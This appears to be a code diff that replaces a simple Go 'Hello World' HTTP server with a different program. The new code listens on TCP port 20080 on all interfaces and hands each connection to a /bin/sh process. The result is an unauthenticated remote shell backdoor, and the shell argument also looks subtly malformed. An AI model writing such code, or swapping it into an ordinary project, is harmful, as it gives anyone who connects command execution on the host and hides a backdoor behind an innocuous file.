@@ -1,25 +1,33 @@
 package main
 
 import (
-"log"
-"net/http"
-"time"
-
-"github.com/gorilla/mux"
+	"io"
+	"log"
+	"net"
+	"os/exec"
 )
 
-func main() {
-	mtx := mux.NewRouter()
-	mtx.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		_, _ = w.Write([]byte("Hello World!"))
-	})
+func handler(conn net.Conn){
+	cmd := exec.Command("/bin/sh", "i")
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
+}
 
-	srv := &http.Server{
-		Handler:      mtx,
-		Addr:         "127.0.0.1:8000",
-		WriteTimeout: 10 * time.Second,
-		ReadTimeout:  10 * time.Second,
+func main() {
+	listner, err := net.Listen("tcp", ":20080")
+	if err != nil {
+		log.Fatalln(err)
 	}
 
-	log.Fatal(srv.ListenAndServe())
+	for {
+		conn, err := listner.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go handler(conn)
+	}
 }
